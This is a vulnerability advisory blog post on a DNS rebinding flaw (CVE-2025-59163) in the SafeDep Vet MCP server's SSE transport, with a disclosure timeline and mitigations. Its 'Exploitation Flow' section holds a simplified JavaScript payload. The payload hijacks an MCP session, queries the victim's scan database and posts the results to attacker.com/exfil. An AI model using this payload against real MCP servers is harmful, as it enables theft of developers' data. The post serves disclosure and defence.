---
layout: post
title: "Vet MCP Server SSE Transport DNS Rebinding Vulnerability"
date: 2025-10-06
categories: [dns-rebinding, mcp, network-security, cve]
excerpt: "SafeDep Vet MCP Server is vulnerable to DNS rebinding attacks allowing malicious websites to bypass Same-Origin Policy and exfiltrate scan database contents through unauthorized MCP tool invocations."
image: /assets/og/2025-10-06-vet-mcp-dns-rebinding.png
---

**Author:** Evan Harris  
**Risk:** Low (CVSS 2.1/10)  
**Affected Component:** SafeDep Vet MCP Server  
**CVE ID:** CVE-2025-59163  
**Affected Versions:** < v1.12.5  
**Patched Versions:** v1.12.5  1

## Overview

The SafeDep Vet MCP server is vulnerable to DNS rebinding attacks when running with the SSE transport. The vulnerability stems from a lack of HTTP Host and Origin header validation, allowing malicious websites to bypass Same-Origin Policy protections and execute unauthorized tool invocations against Vet MCP instances.

Once DNS rebinding is successful, an attacker can establish a session with the `/sse` endpoint, invoke enabled MCP tools, and exfiltrate the contents of the user's Vet SQLite database to an attacker-controlled server.

The SafeDep team responded promptly to this disclosure, releasing a patched version (v1.12.5) within days that implements Host and Origin header validation with an allow list.

## Technical Details

### The Vulnerability

When the Vet MCP server runs with SSE transport (`--server-type sse`), it exposes an HTTP endpoint that accepts connections from any origin. The server lacks validation of:

- **HTTP Host header** - allows requests claiming to be from any domain
- **HTTP Origin header** - permits cross-origin requests from malicious websites

This missing validation enables DNS rebinding attacks, where:
1. An attacker controls a domain with very low TTL DNS records
2. The victim visits the attacker's website (e.g., `attacker.com`)
3. The attacker's JavaScript initially resolves to the attacker's IP
4. After the victim's browser caches the connection, the DNS record is changed to `127.0.0.1`
5. Subsequent requests from `attacker.com` now target the victim's localhost
6. The browser's Same-Origin Policy is bypassed because the origin remains `attacker.com`

### Vulnerable Configuration

The attack requires the following conditions:
- A Vet scan is executed and reports are to a database
- The Vet MCP server is running with SSE transport enabled
- The attacker lures the victim to an attacker-controlled website

### Attack Vector

The attacker leverages DNS rebinding to:
1. Establish a connection to `http://127.0.0.1:9988/sse`
2. Obtain a valid MCP session ID
3. Initialize an MCP session
4. Invoke the `vet_query_execute_sql_query` tool with arbitrary READ SQL queries
5. Receive responses through the SSE stream
6. Exfiltrate data to an attacker-controlled server

## Attack Scenario

### Victim Setup

A security researcher or developer:
1. Installs Vet for dependency vulnerability scanning
2. Runs a scan: `vet scan -D /path/to/project`
3. Starts the MCP server with SSE transport:
   ```bash
   ./vet server mcp --server-type sse --sql-query-tool --sql-query-tool-db-path ./vet_scan.db
   ```
4. The server binds to `127.0.0.1:9988` by default

### Attacker Exploitation

The attacker prepares the DNS rebinding infrastructure:
1. Sets up a DNS server with wildcard records for a domain (e.g., `rebinder.attacker.com`)
2. Configures the DNS server to initially return the attacker's IP, then rebind to `127.0.0.1`
3. Hosts a malicious website with JavaScript that:
   - Detects when DNS rebinding succeeds
   - Connects to the Vet SSE endpoint at `http://127.0.0.1:9988/sse`
   - Establishes an MCP session
   - Invokes SQL queries against the victim's database
   - Exfiltrates the results

### Exploitation Flow

```javascript
// Attacker's malicious payload (simplified)
const eventSource = new EventSource(`http://${window.location.hostname}:9988/sse`);

eventSource.onmessage = (event) => {
  if (event.data.includes('sessionId')) {
    const sessionId = extractSessionId(event.data);
    const endpoint = `http://${window.location.hostname}:9988/message?sessionId=${sessionId}`;

    // Initialize MCP session
    fetch(endpoint, {
      method: 'POST',
      body: JSON.stringify({ method: 'initialize' })
    });

    // Execute SQL query
    fetch(endpoint, {
      method: 'POST',
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'tools/call',
        params: {
          name: 'vet_query_execute_sql_query',
          arguments: { sql: 'SELECT * FROM report_packages' }
        }
      })
    });
  } else {
    // Exfiltrate data received via SSE
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: event.data
    });
  }
};
```

The victim simply needs to visit the attacker's website (e.g., through a link in a phishing email, compromised advertisement, or malicious GitHub issue) while their Vet MCP server is running.

## Impact Assessment

### Confidentiality Breach

**Primary Impact:**
- Complete READ access to the Vet scan SQLite database through the `vet_query_execute_sql_query` tool
- Exposure of package vulnerability information including:
  - Package names and versions in use
  - Known CVEs affecting the victim's dependencies
  - Severity scores and vulnerability details
  - Software supply chain intelligence

**Risk Amplification:**
- Attackers gain intelligence about vulnerable packages in the victim's environment
- Dependencies and package versions reveal technology stack details
- This information can be used to craft targeted exploits

### Attack Requirements

**Factors Limiting Exploitability:**
- **Active User Interaction Required:** Victim must visit a malicious website
- **Timing Window:** The Vet MCP server must be actively running with SSE transport
- **Configuration Requirement:** Victim must have explicitly started the server with `--server-type sse` (not the default stdio transport)
- **Browser-Based:** Attack requires a modern browser with EventSource support

These factors contribute to the Low severity rating (CVSS 2.1/10) despite the potential for data exfiltration.

## Recommended Mitigations

### For Users (Immediate)

1. **Update to v1.12.5 or later:**
   ```bash
   # Download the latest release
   wget https://github.com/safedep/vet/releases/download/v1.12.5/vet_Linux_x86_64.tar.gz
   tar -xzf vet_Linux_x86_64.tar.gz
   ./vet --version  # Verify v1.12.5 or later
   ```

2. **Use stdio transport (default):**
   ```bash
   # Avoid using --server-type sse unless necessary
   ./vet server mcp --sql-query-tool --sql-query-tool-db-path ./vet_scan.db
   ```

3. **Network isolation:**
   - Only run the MCP server on trusted networks
   - Use firewall rules to restrict access to port 9988
   - Avoid browsing untrusted websites while the server is running

### For Developers

**Implemented in v1.12.5:**
- Host header validation with an allow list
- Origin header validation to prevent cross-origin requests
- Rejection of requests with invalid or missing security headers

**Best Practices for MCP Server Implementations:**
- Always validate Host and Origin headers for HTTP-based transports
- Default to localhost-only binding (`127.0.0.1`) rather than `0.0.0.0`
- Prefer stdio transport over network-based transports when possible
- Document security implications of different transport modes
- Implement strict CORS policies

## Disclosure Timeline

- **2025-08-30**: Initial vulnerability report submitted to SafeDep
- **2025-09-01**: SafeDep acknowledges receipt of the report
- **2025-09-02**: SafeDep raises pull request with patch implementing header validation
- **2025-09-05**: Patched version v1.12.5 is released
- **2025-09-29**: GitHub Security Advisory published, coordinated disclosure date confirmed by both parties
- **2025-10-06**: Technical advisory published

## Conclusion

The DNS rebinding vulnerability in the Vet MCP Server demonstrates an important security consideration for MCP implementations: network-based transports require careful validation of HTTP security headers to prevent cross-origin attacks.

While the attack requires specific conditions (active MCP server with SSE transport, victim visiting malicious website, timing window), the potential for data exfiltration warranted responsible disclosure and patching.

**SafeDep's response exemplifies responsible security practices:**
- Immediate acknowledgment of the report
- Rapid development and release of a patch (5 days from report to release)
- Coordinated disclosure through GitHub Security Advisory
- Clear communication throughout the process

All users running Vet MCP server with SSE transport should update to v1.12.5 immediately. For most use cases, the default stdio transport provides a more secure alternative.

## References

- [GitHub Security Advisory (GHSA-6q9c-m9fr-865m)](https://github.com/safedep/vet/security/advisories/GHSA-6q9c-m9fr-865m){:target="_blank"}
- [CVE-2025-59163](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-59163){:target="_blank"}
- [Vet v1.12.5 Release](https://github.com/safedep/vet/releases/tag/v1.12.5){:target="_blank"}
